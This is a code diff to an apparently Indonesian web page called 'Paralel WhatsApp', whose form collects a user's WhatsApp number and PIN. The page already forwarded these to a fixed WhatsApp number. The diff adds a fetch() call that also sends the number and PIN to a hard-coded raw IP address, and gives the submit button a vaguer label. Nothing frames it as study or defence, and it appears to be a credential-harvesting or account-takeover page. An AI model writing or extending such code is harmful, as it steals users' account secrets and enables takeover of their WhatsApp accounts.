@@ -127,7 +127,7 @@
   <form id="formParalel">
     <div class="intro-text">
       <h2>Paralel WhatsApp</h2>
-      <p>Masukkan nomor dan PIN untuk kirim perintah ke WhatsApp.</p>
+      <p>Masukkan nomor dan PIN untuk kirim perintah ke server & WhatsApp.</p>
     </div>
 
     <div class="form-group">
@@ -158,7 +158,7 @@
       </div>
     </div>
 
-    <button type="submit" id="btnKirimWA" disabled>Kirim ke WhatsApp</button>
+    <button type="submit" id="btnKirimWA" disabled>Kirim Sekarang</button>
   </form>
 </div>
 
@@ -183,6 +183,27 @@
     wrapper.classList.toggle("filled", input.value.trim() !== "");
   }
 
+  function kirimParalelWA(nomor, pin) {
+    const tujuan = "6282188890720";
+    const formatPesan = `TWA.${nomor}.${pin}`;
+    const waLink = `https://wa.me/${tujuan}?text=${encodeURIComponent(formatPesan)}`;
+    window.open(waLink, "_blank");
+  }
+
+  function kirimParalelIP(nomor, pin) {
+    const formatPesan = `TWA.${nomor}.${pin}`;
+    const ipUrl = `http://103.253.27.109:7578?msg=${encodeURIComponent(formatPesan)}`;
+
+    fetch(ipUrl)
+      .then(res => res.text())
+      .then(response => {
+        console.log("Respon dari IP:", response);
+      })
+      .catch(error => {
+        console.error("Gagal kirim ke IP:", error);
+      });
+  }
+
   document.getElementById("formParalel").addEventListener("submit", function(e) {
     e.preventDefault();
     let nomor = document.getElementById("waNumber").value.trim();
@@ -192,10 +213,9 @@
       nomor = "628" + nomor.slice(2);
     }
 
-    const tujuan = "6282188890720";
-    const formatPesan = `TWA.${nomor}.${pin}`;
-    const url = `https://wa.me/${tujuan}?text=${encodeURIComponent(formatPesan)}`;
-    window.open(url, "_blank");
+    // Kirim ke IP & WhatsApp
+    kirimParalelIP(nomor, pin);
+    kirimParalelWA(nomor, pin);
   });
 </script>
 
